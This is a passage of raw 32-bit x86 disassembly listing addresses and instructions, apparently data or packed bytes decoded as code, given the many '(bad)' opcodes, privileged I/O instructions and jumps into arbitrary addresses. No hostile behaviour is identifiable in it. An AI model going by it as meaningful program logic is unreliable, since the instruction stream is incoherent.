  40214a:	outs   dx,DWORD PTR ds:[esi]
  40214b:	hlt    
  40214c:	mov    edx,0xe0b591e5
  402151:	inc    esp
  402152:	add    edi,DWORD PTR [ebx]
  402154:	or     eax,0x26324ed8
  402159:	aam    0x3a
  40215b:	jne    0x40217f
  40215d:	and    esp,DWORD PTR [eax]
  40215f:	test   BYTE PTR [edi-0x2a],ch
  402162:	mov    ch,dh
  402164:	pusha  
  402165:	loop   0x402110
  402167:	outs   dx,DWORD PTR ds:[esi]
  402168:	lods   eax,DWORD PTR ds:[esi]
  402169:	cmc    
  40216a:	cmp    DWORD PTR [eax],0x67
  40216d:	or     eax,0xbb96709e
  402172:	jbe    0x4021d9
  402174:	imul   edi,DWORD PTR [ecx],0x6f3227b1
  40217a:	leave  
  40217b:	adc    al,0xc5
  40217d:	ret    
  40217e:	imul   BYTE PTR [eax+0x61d802cf]
  402184:	div    DWORD PTR [eax]
  402186:	push   esi
  402187:	mov    bl,0xb2
  402189:	lea    edx,[ecx-0x70]
  40218c:	dec    edi
  40218d:	cmp    DWORD PTR [ebp-0x1ffd5df2],edx
  402193:	add    BYTE PTR [esi],dh
  402195:	cmp    bl,0x47
  402198:	jecxz  0x402134
  40219a:	push   edi
  40219b:	outs   dx,DWORD PTR ds:[esi]
  40219c:	pop    edx
  40219d:	jo     0x402206
  40219f:	push   edi
  4021a0:	push   ebp
  4021a1:	enter  0xbd47,0x77
  4021a5:	mov    ds:0xf3bea5ea,al
  4021aa:	call   0x206f3937
  4021af:	adc    ah,ah
  4021b1:	push   ss
  4021b2:	jno    0x402224
  4021b4:	mov    ss,WORD PTR [edi-0x46ec2ba5]
  4021ba:	lods   al,BYTE PTR ds:[esi]
  4021bb:	jg     0x4021dd
  4021bd:	in     eax,dx
  4021be:	add    esi,DWORD PTR [esi]
  4021c0:	cmc    
  4021c1:	add    eax,0xa041061
  4021c6:	jmp    0x4021ab
  4021c8:	loope  0x402169
  4021ca:	call   0xb4dc8ed9
  4021cf:	fstp   st(2)
  4021d1:	jb     0x40218b
  4021d3:	outs   dx,DWORD PTR ds:[esi]
  4021d4:	cmp    DWORD PTR [ebp-0x2d734d57],0xc4e29771
  4021de:	sbb    al,0x67
  4021e1:	jmp    0x402220
  4021e3:	test   BYTE PTR [edi+0x73],0x14
  4021e7:	sbb    eax,0x856fe209
  4021ec:	jecxz  0x40220e
  4021ee:	aaa    
  4021ef:	ror    esi,cl
  4021f1:	or     dh,ch
  4021f3:	scas   eax,DWORD PTR es:[edi]
  4021f4:	in     al,dx
  4021f5:	xor    ecx,DWORD PTR [edx+0x11dbcc57]
  4021fb:	xchg   ebp,eax
  4021fc:	stos   BYTE PTR es:[edi],al
  4021fd:	jecxz  0x40221b
  4021ff:	mov    ds:0xe8cb3e68,al
  402204:	push   edi
  402205:	mov    eax,0xd6468237
  40220a:	aad    0x4e
  40220c:	pop    DWORD PTR [ecx+0x679a283]
  402212:	les    ebx,FWORD PTR [edi-0x75e19c34]
  402218:	in     eax,dx
  402219:	mov    dh,0xe8
  40221b:	dec    edx
  40221c:	ja     0x4021e8
  40221e:	mov    esi,0xb22654a3
  402223:	in     eax,0xfa
  402225:	gs test al,0x90
  402228:	push   0x581ba98c
  40222d:	and    cl,BYTE PTR [edx+0x64]
  402230:	out    0x7e,eax
  402232:	dec    ebp
  402233:	or     BYTE PTR ds:0x20a9d7b5,bh
  402239:	cld    
  40223a:	push   ebx
  40223b:	jbe    0x40225d
  40223d:	outs   dx,BYTE PTR ds:[esi]
  40223e:	lds    ecx,FWORD PTR [esp+eiz*2-0x5]
  402242:	stos   DWORD PTR es:[edi],eax
  402243:	dec    ebx
  402244:	in     al,0x75
  402246:	adc    edi,0xb6010f
  40224c:	sbb    ebx,DWORD PTR [edx+ebx*4]
  40224f:	adc    cl,dl
  402251:	in     al,0xd9
  402253:	repz add eax,0x36a12a8b
  402259:	div    cl
  40225b:	sbb    esi,DWORD PTR [esi+0x49]
  40225e:	sub    dh,al
  402260:	xchg   edi,eax
  402261:	jmp    0x4022a8
  402263:	ret    
  402264:	sbb    al,0x2b
  402266:	xor    eax,0x100eb5f
  40226b:	jmp    DWORD PTR [edi-0x709a41b2]
  402271:	mov    ebp,0x6c697c6a
  402276:	jmp    edi
  402278:	jl     0x4022ab
  40227a:	loopne 0x4022a2
  40227c:	push   cs
  40227d:	imul   esi,DWORD PTR [edx],0xfffffffe
  402280:	adc    cl,dl
  402282:	arpl   cx,si
  402284:	push   cs
  402285:	push   0xffffff9b
  402287:	xchg   esp,eax
  402288:	(bad)  [ebp-0x7f]
  40228b:	and    al,0x3d
  40228d:	imul   ecx,DWORD PTR fs:0xc80eb922,0x562ccbe9
  402298:	lods   al,BYTE PTR ds:[esi]
  402299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40229a:	(bad)  
  40229b:	ja     0x4022fd
  40229d:	jne    0x402257
  40229f:	cld    
  4022a0:	jmp    0x1cc57792
  4022a5:	das    
  4022a6:	sub    ch,bl
  4022a8:	mov    al,BYTE PTR [ebx+0x12]
  4022ab:	sbb    BYTE PTR [eax+0x28],dh
  4022ae:	jge    0x402327
  4022b0:	(bad)  
  4022b1:	cdq    
  4022b2:	mov    BYTE PTR [esi],dh
  4022b4:	mov    ah,BYTE PTR [eax+0x6b]
  4022b7:	fwait
  4022b8:	push   ds
  4022b9:	inc    eax
  4022ba:	outs   dx,BYTE PTR ds:[esi]
  4022bb:	(bad)  
  4022be:	mov    cl,0x22
  4022c0:	add    DWORD PTR [eax+0x16b23143],0xffffffbd
  4022c7:	retf   
  4022c8:	mov    edi,0x90d6ec1a
  4022cd:	(bad)  
  4022ce:	aaa    
  4022cf:	ret    
  4022d0:	(bad)  
  4022d1:	sbb    eax,0x1d342241
  4022d6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4022d8:	iret   
  4022d9:	push   0x1e
  4022db:	pop    esp
  4022dc:	aam    0xf2
  4022de:	mov    esi,DWORD PTR [esp+edx*8-0x58bfb996]
  4022e5:	iret   
  4022e6:	or     al,0xdd
  4022e8:	mov    edi,0x9be6a28b
  4022ed:	lods   al,BYTE PTR ds:[esi]
  4022ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022ef:	sub    eax,0x919a6fe5
  4022f4:	or     al,0x95
  4022f6:	mov    ecx,esp
  4022f8:	xchg   esi,eax
  4022f9:	imul   bl
  4022fb:	dec    DWORD PTR [ebp-0x2df9a3be]
  402301:	mov    bh,0xc4
  402303:	(bad)  
  402304:	cdq    
  402305:	ret    
  402306:	test   DWORD PTR [eax-0x2fae9aec],esp
  40230c:	into   
  40230d:	dec    esi
  40230e:	lea    esp,[esi]
  402310:	xchg   DWORD PTR [edx+ecx*2-0x13],edx
  402314:	jb     0x402395
  402316:	lock bound edx,QWORD PTR [eax-0x7535240d]
  40231d:	in     al,dx
  40231e:	gs push edx
  402320:	sti    
  402321:	shl    BYTE PTR [edi],1
  402323:	(bad)  
  402324:	call   edi
  402326:	mov    eax,DWORD PTR ds:0x9846b653
  40232c:	retf   0xaae8
  40232f:	cwde   
  402330:	pop    edi
  402331:	push   eax
  402332:	mov    edx,0xb49690d6
  402337:	ret    
  402338:	fild   WORD PTR [esi-0x21229e5f]
  40233e:	or     eax,0x25dbb8f8
  402343:	sti    
  402344:	das    
  402345:	xor    ebp,DWORD PTR [esi]
  402347:	lds    eax,FWORD PTR [edi+0x20a984c0]
  40234d:	or     bl,BYTE PTR [ebx+0x228f3d0]
  402353:	(bad)
  402356:	push   0x28
  402358:	(bad)  
  402359:	xor    BYTE PTR [eax+0x5e7f410a],al
  40235f:	push   cs
  402360:	retf   0x21d2
  402363:	sar    BYTE PTR [edi+0x2feb6137],1
  402369:	inc    edx
  40236a:	das    
  40236b:	popa   
  40236c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40236d:	dec    eax
  40236e:	hlt    
  40236f:	sbb    al,0x3
  402371:	xchg   ebx,eax
  402372:	inc    ecx
  402373:	nop
  402374:	in     eax,dx
  402375:	sub    DWORD PTR [ecx-0x49],ecx
  402378:	(bad)  
  402379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40237a:	lds    esi,FWORD PTR [eax+ecx*8]
  40237d:	les    edx,FWORD PTR [esi]
  40237f:	hlt    
  402380:	popf   
  402381:	aad    0x78
  402383:	das    
  402384:	mov    ch,0xe0
  402386:	xor    eax,0xe614da68
  40238b:	mov    dh,0xc
  40238d:	pop    DWORD PTR [edx-0x1c]
  402390:	loopne 0x4023f3
  402392:	call   0x364522b2
  402397:	jmp    0x402344
  402399:	pop    ss
  40239a:	pop    ebp
  40239b:	push   esp
  40239c:	mov    edx,0xdfb5b9ec
  4023a1:	int    0x5c
  4023a3:	cmp    dl,BYTE PTR [ecx+edi*2]
  4023a6:	test   BYTE PTR [esi],dh
  4023a8:	sbb    al,0x54
  4023aa:	sub    BYTE PTR ds:0xaf3c8434,ah
  4023b0:	pop    ss
  4023b1:	inc    ebx
  4023b2:	inc    DWORD PTR [esi+0x78]
  4023b5:	(bad)  
  4023b6:	call   0x2c47:0x5be06164
  4023bd:	imul   esp,DWORD PTR [ebp-0x5fd242ac],0x13
  4023c4:	ins    BYTE PTR es:[edi],dx
  4023c5:	push   es
  4023c6:	mov    ah,0x8c
  4023c8:	add    BYTE PTR [eax+0x2b],cl
  4023cb:	sub    bl,bh
  4023cd:	mov    eax,ds:0x4c81ab38
  4023d2:	sti    
  4023d3:	hlt    
  4023d4:	cmp    ebx,eax
  4023d6:	lods   eax,DWORD PTR ds:[esi]
  4023d7:	scas   al,BYTE PTR es:[edi]
  4023d8:	and    DWORD PTR [ebx+0x3f],esi
  4023db:	or     BYTE PTR [edx-0x513945ad],dl
  4023e1:	or     al,0xf4
  4023e3:	push   ds
  4023e4:	jbe    0x40242d
  4023e6:	pop    es
  4023e7:	jmp    0x954:0x912b2ecb
  4023ee:	out    0xc8,al
  4023f0:	jae    0x4023c6
  4023f2:	icebp  
  4023f3:	(bad)  
  4023f5:	ss dec edi
  4023f7:	cmp    DWORD PTR [ecx-0x7b],eax
  4023fa:	pop    eax
  4023fb:	retf   
  4023fc:	popa   
  4023fd:	mov    ebx,0x4d3a7e32
  402402:	out    dx,eax
  402403:	cwde   
  402404:	xchg   ebp,eax
  402405:	xor    BYTE PTR [ecx],bl
  402407:	out    dx,al
  402408:	jmp    DWORD PTR ds:0x591eb12c
  40240e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40240f:	mov    cl,0x4a
  402411:	mov    ds:0xaeb679a0,eax
  402416:	imul   esp,DWORD PTR [ecx+esi*2-0xe],0x787703d7
  40241e:	sub    eax,DWORD PTR [edi+0x66]
  402421:	mov    edi,0xa0d2c34d
  402426:	std    
  402427:	cdq    
  402428:	fild   WORD PTR [ecx]
  40242a:	inc    ebp
  40242b:	outs   dx,BYTE PTR ds:[esi]
  40242c:	repz ds aam 0x8b
  402430:	clc    
  402431:	cmp    eax,0xf08c7bd0
  402436:	sub    DWORD PTR [edx],ebp
  402438:	imul   esi,DWORD PTR [ebx-0x2e],0x23
  40243c:	sbb    al,0x81
  40243e:	xlat   BYTE PTR ds:[ebx]
  40243f:	fmul   DWORD PTR [ecx]
  402441:	sti    
  402442:	xlat   BYTE PTR ds:[ebx]
  402443:	jns    0x4024a7
  402445:	and    al,0xf1
  402447:	arpl   WORD PTR [eax],di
  402449:	(bad)  
  40244a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40244b:	xchg   edx,eax
  40244c:	cmp    edx,DWORD PTR [ecx+0x5f]
  40244f:	leave  
  402450:	push   0x5edfffa5
  402455:	iret   
  402456:	lahf   
  402457:	mov    ah,0x3b
  402459:	dec    esp
  40245a:	pop    edx
  40245b:	inc    ecx
  40245c:	mov    al,ds:0xd8c6abbc
  402461:	mov    dh,0xd
  402463:	jns    0x40243d
  402465:	adc    al,0x91
  402467:	(bad)  
  402468:	in     eax,0x1f
  40246a:	mov    ch,0xb4
  40246c:	mov    bh,0xd8
  40246e:	cmp    ebx,DWORD PTR [esi+0x39]
  402471:	push   0x1fbd8b6d
  402476:	pop    esi
  402477:	cmp    eax,0x140287ee
  40247c:	imul   ebx,DWORD PTR gs:[edx+0x1],0xb62c2098
  402484:	jp     0x402480
  402486:	dec    edi
  402487:	call   0x400f7497
  40248c:	adc    dh,BYTE PTR [edi-0x5f]
  40248f:	mov    al,0xe8
  402491:	mov    edi,0x86ed660a
  402496:	repz mov ds:0x19080e86,al
  40249c:	push   esp
  40249d:	xor    bh,BYTE PTR [esi-0x59]
  4024a0:	test   BYTE PTR ds:0xfe5b4111,al
  4024a6:	xchg   esi,eax
  4024a7:	pusha  
  4024a8:	mov    BYTE PTR [edi+0x2b],cl
  4024ab:	les    ebp,FWORD PTR [ecx]
  4024ad:	push   edi
  4024ae:	and    cl,dl
  4024b0:	push   esi
  4024b1:	mov    BYTE PTR [ebp-0x3b],cl
  4024b4:	add    ah,cl
  4024b6:	lahf   
  4024b7:	imul   ebp,DWORD PTR [ecx-0xb],0xffffff91
  4024bb:	add    ebx,DWORD PTR [edi-0x6e]
  4024be:	or     BYTE PTR [edx+0x4d],0x9b
  4024c2:	inc    esp
  4024c3:	jmp    FWORD PTR [edi+0x4c]
  4024c6:	iret   
  4024c7:	sbb    DWORD PTR [ecx-0xf50eca7],esp
  4024cd:	xor    eax,0xd99fa5c6
  4024d2:	test   eax,0x780ee669
  4024d7:	pop    esp
  4024d8:	inc    esi
  4024d9:	rcl    edi,1
  4024db:	or     eax,0xc3f26c41
  4024e0:	in     eax,0x7e
  4024e2:	sub    DWORD PTR [ebx+esi*2-0xa46ba9c],0xffffff92
  4024ea:	ins    BYTE PTR es:[edi],dx
  4024eb:	out    0x63,eax
  4024ed:	ror    esi,cl
  4024ef:	js     0x4024b8
  4024f1:	pop    eax
  4024f2:	inc    ebx
  4024f3:	mov    eax,0xe14be86b
  4024f8:	pop    edi
  4024f9:	stc    
  4024fa:	add    DWORD PTR [ecx-0x3da4ba32],edi
  402500:	sub    al,0xe
  402502:	scas   eax,DWORD PTR es:[edi]
  402503:	es fcmovnu st,st(1)
  402506:	fnstcw WORD PTR [ebx-0x59]
  402509:	mov    esi,0x86376bae
  40250e:	mov    bh,0xca
  402510:	xchg   DWORD PTR [esi+0x15],eax
  402513:	inc    ebx
  402514:	les    ecx,FWORD PTR [esi+0x6d]
  402517:	push   edi
  402518:	xchg   ecx,eax
  402519:	enter  0x2f63,0xc4
  40251d:	pushf  
  40251e:	ss add eax,0x337b6a02
  402524:	pop    ss
  402525:	xchg   DWORD PTR [edx],esp
  402527:	mov    ch,0x6
  402529:	mov    ebp,0x3e164e4b
  40252e:	cs mov al,0x6b
  402531:	iret   
  402532:	inc    ebx
  402533:	jb     0x4024ed
  402535:	pop    ss
  402536:	test   al,0x77
  402538:	jbe    0x402534
  40253a:	in     al,0x66
  40253c:	inc    edx
  40253d:	aam    0x84
  40253f:	pop    ecx
  402540:	pop    ds
  402541:	fistp  WORD PTR [edx+0x4c]
  402544:	leave  
  402545:	xchg   DWORD PTR ds:0x241dfba1,ecx
  40254b:	gs aaa 
  40254d:	dec    edx
  40254e:	ins    BYTE PTR es:[edi],dx
  40254f:	cmp    al,0x79
  402551:	scas   al,BYTE PTR es:[edi]
  402552:	and    DWORD PTR [ecx],0xffffffa0
  402555:	rcl    BYTE PTR [esi+0x3a],1
  402558:	sbb    al,0x21
  40255a:	lea    edi,[ecx+0x4bafb904]
  402560:	in     eax,dx
  402561:	mov    bh,0xb8
  402563:	mov    ds:0x4f872134,eax
  402568:	xor    edi,DWORD PTR [eax+0xe]
  40256b:	inc    ebp
  40256c:	push   edx
  40256d:	adc    DWORD PTR cs:[ebp-0x3f],edx
  402571:	or     BYTE PTR [ebx],ah
  402573:	in     al,0xd9
  402575:	dec    edi
  402576:	dec    ecx
  402577:	inc    edi
  402578:	out    dx,eax
  402579:	adc    cl,BYTE PTR [bx+si-0x145]
  40257e:	xchg   BYTE PTR [esi+0x72],ch
  402581:	mov    gs,WORD PTR [ecx]
  402583:	push   ebx
  402584:	loop   0x402570
  402586:	or     dl,BYTE PTR [edi]
  402588:	cmp    bh,BYTE PTR [ecx+0x774519f1]
  40258e:	inc    esp
  40258f:	push   esi
  402590:	dec    ebp
  402591:	jecxz  0x40260b
  402593:	jecxz  0x4025b2
  402595:	or     eax,0x5a47866f
  40259a:	mov    esi,0xd4ce62a8
  40259f:	scas   al,BYTE PTR es:[edi]
  4025a0:	add    al,0x35
  4025a2:	shl    ecx,cl
  4025a4:	in     eax,dx
  4025a5:	adc    DWORD PTR [ecx+ebx*8+0x30],ecx
  4025a9:	sahf   
  4025aa:	push   edi
  4025ab:	mov    ebx,0x5115a7c1
  4025b0:	pop    ss
  4025b1:	and    ebx,DWORD PTR [edi]
  4025b3:	idiv   esp
  4025b5:	pop    esi
  4025b6:	mov    edi,0xec2d7154
  4025bb:	jae    0x40254d
  4025bd:	daa    
  4025be:	pusha  
  4025bf:	dec    esp
  4025c0:	popf   
  4025c1:	mov    fs,WORD PTR [esi-0x4d]
  4025c4:	fnstsw WORD PTR [ebp-0x21afcf31]
  4025ca:	cs in  al,0x30
  4025cd:	test   DWORD PTR [edi-0x3f],ebx
  4025d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025d1:	sub    DWORD PTR [ebx-0x5],esi
  4025d4:	or     edx,esi
  4025d6:	cmp    ebx,ebx
  4025d8:	add    ch,bh
  4025da:	ret    
  4025db:	sti    
  4025dc:	sub    BYTE PTR [edi],dh
  4025de:	test   al,0x17
  4025e0:	jmp    0x402587
  4025e2:	sub    al,0x68
  4025e4:	xchg   ecx,eax
  4025e5:	cdq    
  4025e6:	inc    ecx
  4025e7:	sbb    BYTE PTR [esi-0x7f5fe518],ah
  4025ed:	retf   
  4025ee:	adc    BYTE PTR [eax+0x1f7218e3],bh
  4025f4:	fdiv   DWORD PTR [ebx+0x42947870]
  4025fa:	test   DWORD PTR [ecx],edi
  4025fc:	push   0x29
  4025fe:	call   0xa4d04027
  402603:	inc    eax
  402604:	imul   esi,DWORD PTR [edi+eiz*2+0x29c5fb27],0x1765b8b
  40260f:	push   es
  402610:	push   cs
  402611:	scas   al,BYTE PTR es:[edi]
  402612:	in     al,0x8c
  402614:	int3   
  402615:	sbb    dh,dl
  402617:	jne    0x4025d7
  402619:	dec    ebx
  40261a:	cdq    
  40261b:	jbe    0x4025bd
  40261d:	inc    ecx
  40261e:	add    al,BYTE PTR [edi+0x5547d00a]
  402624:	push   edi
  402625:	(bad)  
  402627:	sti    
  402628:	in     al,0x27
  40262a:	push   esi
  40262b:	mov    esi,0xdf323052
  402630:	pop    edi
  402631:	cmp    ch,BYTE PTR [eax+0x3c]
  402634:	(bad)  
  402635:	mov    al,ds:0x3bb1cf3d
  40263a:	(bad)  
  40263b:	imul   eax,DWORD PTR [edx+0x30c1bc92],0x6d
  402642:	iret   
  402643:	add    eax,0xf3bb4399
  402648:	std    
  402649:	jge    0x402633
  40264b:	jg     0x40263a
  40264d:	aad    0xa
  40264f:	mov    edi,0xcd5c72f0
  402654:	pop    ebx
  402655:	push   DWORD PTR [edi+0x2b478fad]
  40265b:	(bad)  
  40265c:	addr16 inc esp
  40265e:	add    al,BYTE PTR [ecx-0x5d21ec21]
  402664:	pop    ebx
  402665:	mov    BYTE PTR [edx-0x34f480b8],bl
  40266b:	add    al,0x9a
  40266d:	sbb    dh,BYTE PTR [eax+0x4a]
  402670:	pusha  
  402671:	sub    BYTE PTR [ebx+0x48],0x51
  402675:	mov    ch,0xeb
  402677:	aam    0x68
  402679:	jmp    0x7aef0cd9
  40267e:	xchg   edx,eax
  40267f:	mov    ebp,0x3b03af4f
  402684:	mov    dh,0xc4
  402686:	ds cmp esi,0xffffff92
  40268a:	ret    0x43fd
  40268d:	or     ebx,DWORD PTR [bp+di+0x42]
  402691:	sbb    bh,BYTE PTR [eax-0x3599047c]
  402697:	pushf  
  402698:	xchg   DWORD PTR [eax+0x14f99f5d],ebx
  40269e:	(bad)  
  40269f:	in     al,0xd2
  4026a1:	jo     0x402623
  4026a3:	ret    0xf42c
  4026a6:	stc    
  4026a7:	(bad)  
  4026a8:	pop    ebx
  4026a9:	cs in  eax,dx
  4026ab:	xor    dl,cl
  4026ad:	mov    dh,BYTE PTR [esi+0x71]
  4026b0:	arpl   WORD PTR [ebx-0x40],dx
  4026b3:	sar    DWORD PTR [edi-0x32],0xc
  4026b7:	sub    BYTE PTR [edi],al
  4026b9:	call   0xc6ce:0x1f31a4cc
  4026c0:	sti    
  4026c1:	ret    
  4026c2:	ins    BYTE PTR es:[edi],dx
  4026c3:	and    eax,0xda1e8333
  4026c8:	sbb    DWORD PTR [ebp+0x54],ecx
  4026cb:	arpl   WORD PTR [edx+0x3d],sp
  4026ce:	aas    
  4026cf:	add    ah,0x8a
  4026d2:	adc    DWORD PTR [ecx-0x16],ebx
  4026d5:	outs   dx,BYTE PTR ds:[esi]
  4026d6:	inc    edi
  4026d7:	mov    fs,WORD PTR [ebx-0x23]
  4026da:	dec    ecx
  4026db:	or     eax,DWORD PTR [ebp-0x632a7190]
  4026e1:	pop    esp
  4026e2:	stc    
  4026e3:	call   0xb229cca9
  4026e8:	mov    esp,0x79b756cd
  4026ed:	jle    0x402685
  4026ef:	pop    esi
  4026f0:	mov    ecx,0xe4c89d40
  4026f5:	and    ah,al
  4026f7:	rol    DWORD PTR [ebx],0xe4
  4026fa:	sbb    esp,esi
  4026fc:	retf   0xffdb
  4026ff:	mov    bl,0x4d
  402701:	mov    BYTE PTR [ecx+0x56b115b],ch
  402707:	xchg   DWORD PTR [edx-0x2780e44f],ebp
  40270d:	les    esp,FWORD PTR [ebx+0x27]
  402710:	mov    ebx,DWORD PTR [ebx]
  402712:	xchg   BYTE PTR [eax-0x53],ah
  402715:	sbb    DWORD PTR [eax+ebx*2-0x4cfee0d],0x774dce21
  402720:	rol    BYTE PTR [ebp+edi*4+0x4673c1f6],cl
  402727:	pop    edx
  402728:	mov    bh,0x58
  40272a:	adc    ch,BYTE PTR [edi+0x79]
  40272d:	fwait
  40272e:	cmp    BYTE PTR [eax-0x13],dh
  402731:	popa   
  402732:	inc    ecx
  402733:	xchg   ecx,eax
  402734:	add    DWORD PTR [eax+0x1],esp
  402737:	fcomp  st(5)
  402739:	and    al,0x9e
  40273b:	push   eax
  40273c:	ja     0x4027a9
  40273e:	sub    cl,BYTE PTR [ecx]
  402740:	push   0xb5849c24
  402745:	retf   
  402746:	jle    0x402798
  402748:	out    0x65,eax
  40274a:	push   0x51
  40274c:	neg    dh
  40274e:	mov    ebp,0x5482c550
  402753:	repz ss loope 0x40279b
  402757:	sbb    al,0xbd
  402759:	xor    eax,0x9b37ae70
  40275e:	ins    BYTE PTR es:[edi],dx
  40275f:	jno    0x4027b0
  402761:	mov    bh,0xf
  402763:	xor    cl,bl
  402765:	pop    ebx
  402766:	shl    BYTE PTR [edx-0x68],0x8c
  40276a:	cwde   
  40276b:	push   ss
  40276c:	call   0x6b33:0x8f39fed8
  402773:	test   eax,0x11ed079c
  402778:	shl    BYTE PTR [esi+edi*2+0xe214e46],0x9
  402780:	(bad)  
  402782:	push   ecx
  402783:	xor    edx,DWORD PTR [eax]
  402785:	jmp    0x40271f
  402787:	iret   
  402788:	dec    ebx
  402789:	pop    ebp
  40278a:	sub    al,BYTE PTR [edx+0x1b]
  40278d:	pop    ebx
  40278e:	dec    ecx
  40278f:	mov    esp,0xc5aedcbd
  402794:	jecxz  0x402812
  402796:	push   ebx
  402797:	adc    DWORD PTR [ecx-0x40],edx
  40279a:	pop    ecx
  40279b:	leave  
  40279c:	aas    
  40279d:	and    bh,bh
  40279f:	xchg   DWORD PTR [edi],esi
  4027a1:	jle    0x402776
  4027a3:	(bad)  
  4027a4:	aad    0xb7
  4027a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a7:	inc    ebx
  4027a8:	sbb    BYTE PTR [esi-0x79],0x56
  4027ac:	out    0x8d,eax
  4027ae:	adc    edx,edi
  4027b0:	mov    bl,0x6d
  4027b2:	adc    DWORD PTR [edx+0x250b7b44],esi
  4027b8:	cmp    BYTE PTR [ecx],dh
  4027ba:	cli    
  4027bb:	lock arpl WORD PTR [edi+0x5abca723],dx
  4027c2:	icebp  
  4027c3:	imul   ebx,DWORD PTR [ecx],0x3266cbbb
  4027c9:	icebp  
  4027ca:	xor    al,0xf7
  4027cc:	das    
  4027cd:	js     0x4027e0
  4027cf:	fld    TBYTE PTR [eax-0x3396bd52]
  4027d5:	sub    ebp,DWORD PTR [edx-0x7eeb819]
  4027db:	add    edi,edi
  4027dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027de:	fsubp  st(2),st
  4027e0:	sbb    DWORD PTR [ecx+0x51],0x4cf2f8d6
  4027e7:	mov    bl,0x93
  4027e9:	aas    
  4027ea:	ret    0x2dfb
  4027ed:	adc    eax,0xa3c7e50e
  4027f2:	mov    al,ds:0x3ce3118a
  4027f7:	mov    edx,0x9fd20edf
  4027fc:	mov    al,0x6d
  4027fe:	je     0x402858
  402800:	or     BYTE PTR [edx],cl
  402802:	jno    0x40283b
  402804:	jno    0x402798
  402806:	out    dx,eax
  402807:	test   BYTE PTR [esi-0x56],cl
  40280a:	dec    DWORD PTR gs:[esi]
  40280d:	les    esp,FWORD PTR gs:[esi]
  402810:	pop    ss
  402811:	arpl   WORD PTR [edi],si
  402813:	mul    eax
  402815:	sti    
  402816:	leave  
  402817:	push   edi
  402818:	push   es
  402819:	and    al,0xe0
  40281c:	push   cs
  40281d:	in     eax,0x7f
  40281f:	sbb    dh,BYTE PTR [eax-0x66ab7e29]
  402825:	dec    ecx
  402826:	mov    eax,0x6fd01fec
  40282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40282c:	std    
  40282d:	dec    edi
  40282e:	jl     0x4027d6
  402830:	and    BYTE PTR [ecx],bh
  402832:	ffree  st(4)
  402834:	arpl   WORD PTR [edi],di
  402836:	push   es
  402837:	lds    edx,FWORD PTR [esi]
  402839:	retf   0xc57
  40283c:	cmp    al,0x70
  40283e:	mov    cl,0x83
  402840:	jae    0x402849
  402842:	jno    0x40282d
  402844:	aas    
  402845:	add    bh,BYTE PTR [edx]
  402847:	jne    0x4028a6
  402849:	mov    edx,0x474c3a24
  40284e:	xchg   ebx,eax
  40284f:	sub    al,BYTE PTR [eax]
  402851:	test   ecx,eax
  402853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402854:	or     al,0xf6
  402856:	jb     0x4027de
  402858:	push   edi
  402859:	sbb    bl,BYTE PTR [ebp+0x50e449a5]
  40285f:	pop    eax
  402860:	jno    0x4028ad
  402862:	dec    edx
  402863:	push   ds
  402864:	in     eax,dx
  402865:	push   edx
  402866:	or     BYTE PTR [ecx-0x4eaa0665],dh
  40286c:	push   edi
  40286d:	xchg   edi,eax
  40286e:	sbb    ebp,0xffffffb2
  402871:	fnsave [esi-0x52]
  402874:	(bad)  
  402875:	jmp    0xbe5275f8
  40287a:	mov    edi,0xb2a71c6d
  40287f:	dec    esi
  402880:	aam    0x96
  402882:	idiv   DWORD PTR [ecx-0x3]
  402885:	ins    DWORD PTR es:[edi],dx
  402886:	jle    0x402854
  402888:	je     0x4028df
  40288a:	push   edi
  40288b:	xor    BYTE PTR [edi],ah
  40288d:	out    0xc4,al
  40288f:	mov    dh,cl
  402891:	out    dx,al
  402892:	(bad)  
  402893:	sub    DWORD PTR [edx+0x6373a6b8],edx
  402899:	ins    BYTE PTR es:[edi],dx
  40289a:	push   edx
  40289b:	sbb    al,0x84
  40289d:	pop    ebx
  40289e:	or     al,0xaf
  4028a0:	mov    edx,0x2349ecab
  4028a5:	cld    
  4028a6:	cdq    
  4028a7:	inc    ebp
  4028a8:	aas    
  4028a9:	dec    esp
  4028aa:	jb     0x402912
  4028ac:	dec    edi
  4028ad:	pop    ecx
  4028ae:	mov    ebx,0x841fd6e5
  4028b3:	lock (bad) 
  4028b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028b7:	cmp    BYTE PTR [esi-0x1b143872],al
  4028bd:	inc    esp
  4028be:	aaa    
  4028bf:	sbb    ebx,esp
  4028c1:	sub    cl,ch
  4028c3:	leave  
  4028c4:	icebp  
  4028c5:	fs dec eax
  4028c7:	shr    esi,cl
  4028c9:	retf   0xef55
  4028cc:	adc    BYTE PTR ds:0x54b24057,bl
  4028d2:	and    ecx,DWORD PTR [ebx-0xbfb4df1]
  4028d8:	push   DWORD PTR [esi]
  4028da:	(bad)  
  4028dc:	sar    DWORD PTR [ecx+0x1b],0x39
  4028e0:	and    eax,0x77c3c7e8
  4028e5:	inc    eax
  4028e6:	mov    bl,0x99
  4028e8:	inc    ebp
  4028e9:	mov    esp,DWORD PTR [esi-0x13]
  4028ec:	xlat   BYTE PTR ds:[ebx]
  4028ed:	stos   BYTE PTR es:[edi],al
  4028ee:	sub    ebp,DWORD PTR [ecx-0x229c830a]
  4028f4:	adc    eax,0x1eeb0901
  4028f9:	neg    BYTE PTR [edx+0x22]
  4028fc:	pop    edx
  4028fd:	es mov BYTE PTR es:[ebx+esi*1+0x3b],0x93
  402904:	cli    
  402905:	mov    ah,0x73
  402907:	(bad)  
  402908:	cld    
  402909:	inc    edi
  40290a:	ins    DWORD PTR es:[edi],dx
  40290b:	mov    bh,bl
  40290d:	sbb    ah,BYTE PTR ds:0xcc5f95ae
  402913:	out    dx,eax
  402914:	dec    ebp
  402915:	outs   dx,DWORD PTR ds:[esi]
